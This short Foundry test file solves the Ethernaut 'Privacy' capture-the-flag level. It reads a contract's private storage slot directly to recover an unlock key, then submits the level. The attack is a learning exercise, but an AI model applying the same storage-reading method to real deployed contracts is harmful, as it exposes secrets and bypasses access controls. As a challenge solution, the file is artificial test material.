// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {PrivacyFactory} from "../src/12-Privacy/PrivacyFactory.sol";
import {Privacy} from "../src/12-Privacy/Privacy.sol";

contract PrivacyTest is Test {
    Ethernaut public ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function test_PrivacyAttack() public {
        // SETUP
        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(levelAddress);

        // ATTACK
        bytes16 key = bytes16(vm.load(levelAddress, bytes32(uint256(5))));
        ethernautPrivacy.unlock(key);

        // SUBMIT
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
    }
}
